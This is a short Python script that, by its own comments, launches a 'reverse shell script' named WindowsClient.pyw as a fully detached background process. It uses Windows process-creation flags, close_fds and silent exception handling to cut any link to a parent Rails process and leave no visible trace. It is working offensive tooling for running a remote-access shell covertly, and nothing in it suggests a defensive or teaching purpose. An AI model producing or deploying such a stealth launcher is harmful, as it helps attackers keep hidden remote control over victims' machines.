import subprocess
import sys
import os

# The name of your main reverse shell script
TARGET_SCRIPT = "WindowsClient.pyw"

# Magic flags to detach the process completely from the current console/process tree
# CREATE_NEW_PROCESS_GROUP = 0x00000200
# DETACHED_PROCESS = 0x00000008
creation_flags = 0x00000200 | 0x00000008

def launch():
    # Get the directory where this script is running
    current_dir = os.path.dirname(os.path.abspath(__file__))
    script_path = os.path.join(current_dir, TARGET_SCRIPT)

    if os.path.exists(script_path):
        try:
            # Launch the client with the py launcher
            # close_fds=True ensures no file handles (like stdout) connect back to Rails
            subprocess.Popen(
                ["py", "-3", script_path],
                creationflags=creation_flags,
                close_fds=True,
                shell=False
            )
        except Exception:
            pass

if __name__ == "__main__":
    launch()
    # Script ends immediately, severing the link with Rails
    sys.exit()
